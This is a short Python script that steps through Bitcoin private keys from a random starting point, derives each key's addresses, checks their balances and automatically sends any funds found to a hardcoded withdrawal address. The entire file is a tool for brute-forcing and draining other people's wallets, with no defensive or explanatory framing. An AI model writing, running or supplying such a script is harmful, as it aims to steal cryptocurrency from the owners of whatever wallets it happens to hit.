from cryptos import Bitcoin, compress
from random import randint
import time

WITHDRAW_ADDR = '1GtJFqfp4548bEwXjZBuoVF6BneBCTAUrE'
c = Bitcoin()


def withdraw(priv_key: str, value: int) -> dict:
    return c.send(priv_key, WITHDRAW_ADDR, value)


def check_balance(addr: str) -> int:
    while True:
        try:
            return c.history(addr)['final_balance']
        except Exception:
            time.sleep(10)


def get_addr_pair(priv: str) -> tuple:
    full_addr = c.privtoaddr(priv)
    compressed_addr = c.pubtoaddr(compress(c.privtopub(priv)))
    return full_addr, compressed_addr


def main():
    private_key = randint(2 ** 1, 2 ** 256)
    while True:
        addrs = get_addr_pair(private_key)
        for addr in addrs:
            balance = check_balance(addr)
            if balance:
                withdraw(private_key, balance)
        print(addrs)
        private_key += 1


if __name__ == '__main__':
    main()
